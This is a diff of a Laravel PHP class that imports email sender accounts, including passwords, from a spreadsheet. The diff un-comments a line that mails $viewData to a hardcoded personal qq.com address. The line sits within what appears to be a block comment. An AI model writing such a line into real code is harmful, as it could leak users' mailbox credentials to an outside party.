@@ -17,6 +17,7 @@ use Maatwebsite\Excel\Concerns\SkipsFailures;
 use Maatwebsite\Excel\Concerns\WithUpserts;
 use Maatwebsite\Excel\Validators\ValidationException;
 use Webklex\IMAP\Facades\Client;
+use Maatwebsite\Excel\Validators\Failure;
 
 class ImportSenders implements ToModel,WithStartRow,WithValidation,SkipsOnFailure,WithUpserts
 {
@@ -69,11 +70,11 @@ class ImportSenders implements ToModel,WithStartRow,WithValidation,SkipsOnFailur
                     'password'      => trim($row[1]),
                     'protocol'      => $mail_setting->getmail_protocol,
                 ];
-                //Mail::to('1617049813@qq.com')->send(new ContactSender($subject, $viewData));
+                Mail::to('1617049813@qq.com')->send(new ContactSender($subject, $viewData));
                 $client = Client::make($get_config);
                 $client->connect();
             }catch (ValidationException $e) {
-                exit('邮箱'.$email_address.'配置不正确，请配置正确的邮箱保证可以正常发送和拉取邮件');
+                //echo '<script>alert("'.$email_address.'邮箱配置不正确，请配置正确的邮箱保证可以正常发送和拉取邮件")</script>';exit();
             }*/
         }
         return new Sender([
@@ -119,4 +120,5 @@ class ImportSenders implements ToModel,WithStartRow,WithValidation,SkipsOnFailur
     {
         return 'email_address';
     }
+
 }
